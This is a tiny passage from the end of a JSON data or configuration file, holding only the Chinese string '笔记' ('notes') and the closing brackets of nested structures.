                "笔记"
            ]
        }
    ]
}